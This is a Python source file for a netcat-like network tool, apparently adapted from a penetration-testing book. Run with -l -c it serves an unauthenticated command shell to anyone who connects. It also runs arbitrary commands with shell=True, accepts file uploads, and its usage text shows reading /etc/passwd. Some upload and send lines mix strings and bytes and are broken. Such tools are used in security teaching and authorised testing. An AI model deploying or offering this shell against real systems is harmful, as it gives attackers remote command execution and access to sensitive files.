#!/usr/bin/python3

import sys
import socket
import getopt
import threading
import subprocess

# define global variables
listen = False
command = False
upload =False
execute = ""
target = ""
upload_destination = ""
port = 0

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    # no arg given, display proper usage
    if not len(sys.argv[1:]):
        usage()
    
    # interpret switches
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help","listen","execute","target","port","command","upload"]) 
        for o,a in opts:
            if o in ("-h","--help"):
                usage()
            elif o in ("-l","--listen"):
                listen = True
            elif o in ("-e","--execute"):
                execute = a
            elif o in ("-c","--command"):
                command = True
            elif o in ("-u","--upload"):
                upload_destination = a
            elif o in ("-t","--target"):
                target = a
            elif o in ("-p","--port"):
                port = int(a)
            else:
                assert False,"Unhandled Option"
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    if not listen and len(target) and port > 0:
        print("CTRL + D to enter shell")
        buffer = sys.stdin.read()
        client_sender(buffer)
    if listen:
        server_loop()

# Display possible args
def usage():
    print("Usage: net-tool.py -t host -p port")
    print("-l --listen                  - listen on [host]:[port] for incoming connections")
    print("-e --execute=file            - execute the given file upon receiving a connection")
    print("-c --command                 - initialize shell")
    print("-u --upload=destination      - upon connecting upload file to [destination]")
    print("-t --target                  - define target to connect to")
    print("-p --port                    - define port to connect to")
    print("\b\b")
    print("Example:")
    print("net-tool.py -t 0.0.0.0 -p 5000 -l -c")
    print("net-tool.py -t 0.0.0.0 -p 5000 -l -u=c:\\target.exe")
    print("net-tool.py -t 0.0.0.0 -p 5000 -l -e=\"cat /etc/passwd\"")
    print("echo 'abcdef' | ./net-tool.py -t 0.0.0.0 -p 135")
    sys.exit(0)

# Connect, receive & send data to target
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode('utf-8'))

        # receive, interpret and respond
        while True:
            recv_len = 1
            response = b''
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break

            print(response.decode('utf-8'), end=' ')

            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode('utf-8'))
    except socket.error as exc:
        print("[*] Exception! Exiting.")
        print(f"[*] Caught exception socket.error: {exc}")
        client.close()

# Listener function
def server_loop():
    global target

    # if target not defined, listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

# Interpret args
def run_command(command):
    command = command.rstrip()

    # run the command, get output
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    return output

# target interaction function
def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer.encode('utf-8'))
            file_descriptor.close()
            client_socket.send(f"Successfully saved file to {upload_destination}\r\n")
        except OSError:
            client_socket.send(f"Failed to save file to {upload_destination}\r\n")

    # check command execution
    if len(execute):
        # run command
        output = run_command(execute)
        client_socket.send(output)

    # go into loop if shell requested
    if command:
        while True:
            client_socket.send("<BHP:#> ".encode('utf-8'))
            # receive until enter key pressed
            cmd_buffer = b''
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            # send command
            response = run_command(cmd_buffer)
            client_socket.send(response)

main()